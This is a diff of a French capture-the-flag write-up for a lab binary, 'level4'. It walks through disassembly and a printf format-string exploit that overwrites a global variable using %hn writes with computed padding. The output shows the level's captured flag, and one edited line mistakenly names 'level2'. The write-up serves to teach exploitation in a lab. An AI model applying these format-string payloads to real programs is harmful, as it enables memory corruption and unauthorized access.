@@ -1,16 +1,16 @@
 # Level4
 
-On observe un executable a la racine `level4`
+On observe un exécutable à la racine : `level4`
 
-```bash
+```shell
 $ ./level4
 Hello World
 Hello World
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
-```bash
+```shell
 $ gdb level4 -q
 Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
 (gdb) set disassembl
@@ -60,45 +60,43 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level4`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level2`
 
-```bash
+```shell
 $ scp -P 4242 -r level4@192.168.56.102:/home/user/level4/level4 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level4
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_résultat sauvegardé dans [source.md](source.md)_
 
-Meme exercice que le `level3` mais cette fois `m` est compare avec `0x1025544` et printf est dans une function
+Même exercice que `level3` mais cette fois `m` est comparé avec `0x1025544` et printf est dans une sous-fonction.
 
-Dans un premier temps, on essaye d'afficher notre `AAAA` grace au `%x` de printf en modifiant la value `i` dans `%i$x`.
+Dans un premier temps, on essaye d'afficher notre `AAAA` grâce au `%x` de printf en modifiant `i` dans `%i$x`.
 
 On obtient `i = 12`
 
-```bash
+```shell
 $ python -c 'print "AAAA %12$x"' | ./level4
 AAAA 41414141
 ```
 
-On remplace `AAAA` par l'adresse de `m` et on verifie
+On remplace `AAAA` par l'adresse de `m` et on vérifie
 
-```bash
+```shell
 $ python -c 'print "\x10\x98\x04\x08 %12$.8x"' | ./level4
  08049810
 ```
 
-plus qu'a changer la valeur de `m` grace au `%n` de printf mais `0x1025544` est trop gros pour le faire en une fois.
-Nous allons donc ecrire `0x0102` sur 2octets et `0x5544` 2 octets plus loin pour former notre nombre final `0x1025544`
+On doit maintenant changer la valeur de `m` grace au `%n` de printf mais `0x1025544` est trop gros pour le faire en une seule fois.
+Nous allons donc écrire `0x0102` sur 2 octets et `0x5544` 2 octets plus loin pour former notre nombre final `0x1025544`
 
-```bash
+- <code>102<sub>16</sub> = 258<sub>10</sub> = les 8 caractères des deux adresses + 250 ' '.</code>
+- <code>5544<sub>16</sub> = 21828<sub>10</sub> = 21570 ' ' + les 258 caractères déjà écrits.</code>
+
+```shell
 $ python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250d%12$hn%21570d%13$hn"' | ./level4
 ...
                                                -1073743996
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-
-level4:$ su level5
-Password:
-
-level5:$
 ```
